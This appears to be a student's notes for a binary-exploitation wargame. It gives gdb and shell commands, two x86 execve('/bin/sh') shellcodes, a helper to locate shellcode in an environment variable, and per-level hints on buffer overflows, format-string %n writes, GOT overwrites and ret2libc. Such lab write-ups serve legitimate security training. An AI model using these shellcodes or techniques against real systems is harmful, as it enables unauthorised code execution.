# commands

## shell commands
to print hex values
```
perl -e 'print "A"x12 . "\x2a"'
```

to keep stdin open
- `(echo "hey"; cat) | ./whatever`
- `echo "hey" > /tmp/args && cat /tmp/args - | ./whatever`

dump memory at `0x80486a0` with 1 line before & 3 lines after
- `xxd level0 | grep -B1 -A3 "00006a0"`
- radare2 -> `g` + `0x80486a0`

## gdb commands
always show 3 code line (undisplay 1)
```
display/3i $pc
```

run and sent in stdin
```
r < <(perl -e 'print "A"x5')
```

find in memory
```bash
info proc map  # to get the address
# find <start>, <end>, <str>
find 0xb7e2b000, 0xc0000000, "/bin/sh"

# with gdb
find "/bin/sh"
```

## shellcode
length = 21
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

length = 28
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### in env var
```c
/* /tmp/getenv.c */

/*
compile:
gcc -g -w /tmp/getenv.c -o /tmp/getenv
execute (pwd = /tmp)
./getenv SHELLCODE
*/
#include <unistd.h>

int main(int ac, char ** av) {
	if (ac < 2)
		printf("./getenv <env-var-name>");
	else
		printf("%s address: 0x%lx\n", av[1], getenv(av[1]));
	return 0;
}
```
```bash
> gcc -g -w /tmp/getenv.c -o /tmp/getenv && cd /tmp && ./getenv SHELLCODE && cd -
SHELLCODE address: 0xbffff845
```
```bash
export SHELLCODE="`perl -e 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`"
```

## asm
### rep
Repeat string operation:
- `rep movs` -> used for memcpy
- `rep stos` -> used for memset
- `repnz scas` -> used for strlen

All rep type:
- `rep` -> repeat while equal
- `repnz` -> repeat while nonzero
- `repz` -> repeat while zero

## levels

### level0
appel avec le bon nombre en arg

### level1
call une fonction caché

### level2
insert a shellcode.

call it with a call eax (`objdump -d level2 | grep call`)

### level3
avec printf

changer la valeur de la variable `0x804988c` a 64 pour passer un if

pour rappel:
```C
printf("%2\$x");  // ecrit le 2eme arg (en pointeur)
printf("%5\$n");  // ecrit le nombre de char deja print a l'address
// a un certain offset, l'argument est le parametre principal de printf
```

### level4
pareil que le 3 mais faut ecrire un grand nombre:
```C
// ecrire un grand nombre de char
"%250x"
// ecrire sur 2 octet (et pas 4)
"%12\$hn"
```

### level5
toujours printf.

il faut changer l'adresse qui pointe sur exit (0x8049838) avec l'addresse de o (0x080484a4).

### level6
faut juste changer l'addresse (call eax) avec l'adresse de n

### level7
dans le premier arg, il faut envoyer 20 char puis l'adresse de puts (0x8049928).

Ca va permettre d'ecrire a cette adresse l'adresse de m (0x080484f4)

### level8
"auth "
"service0123456701234567"
"login"

### level9
c++

faut envoyer un shellcode en argument et faire pointer vers ce shellcode

a la fin il y a un call edx -> pour trouver l'offset, il faut `b *main+142` et regarder la valeur de l'EAX.

/!\ avant le shellcode, il faut mettre un jump de quelques octets

### bonus0
faut mettre le shellcode dans une var d'environnement

apres on envoie une str de 4096 (premier read) puis l'addr du shellcode dans la 2eme (offset de 9 avec des char apres)

### bonus1
```
./bonus1 <int> <str>
```
ca copy `4*av[0]` char dans un strcpy (sur un char[40]).

il faut donc copier 44 char

pour faire ca, il faut envoyer un nombre negatif

### bonus2
il faut passer la var LANG a 'fi'

ensuite faut appeler system (`i func system`) avec "/bin/sh" (`find 0xb7e2b000, 0xc0000000, "/bin/sh"`)

faut trouver les offset et envoyer le /bin/sh en permier arg et system en second arg

### bonus3
just `./bonus3 ""` :)
